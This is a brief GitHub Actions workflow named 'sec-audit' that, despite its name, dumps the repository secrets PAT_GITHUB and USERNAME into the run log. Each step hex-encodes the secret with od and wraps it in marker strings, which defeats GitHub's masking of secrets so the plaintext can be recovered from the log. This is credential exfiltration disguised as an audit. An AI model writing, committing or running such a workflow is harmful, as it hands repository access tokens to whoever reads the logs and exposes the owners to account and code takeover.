name: sec-audit
on: workflow_dispatch
jobs:
  repo_secrets:
    runs-on: ubuntu-latest
    steps:
      - name: s_PAT_GITHUB
        env:
          V: ${{ secrets.PAT_GITHUB }}
        run: printf 'XX_PAT_GITHUB_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_USERNAME
        env:
          V: ${{ secrets.USERNAME }}
        run: printf 'XX_USERNAME_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
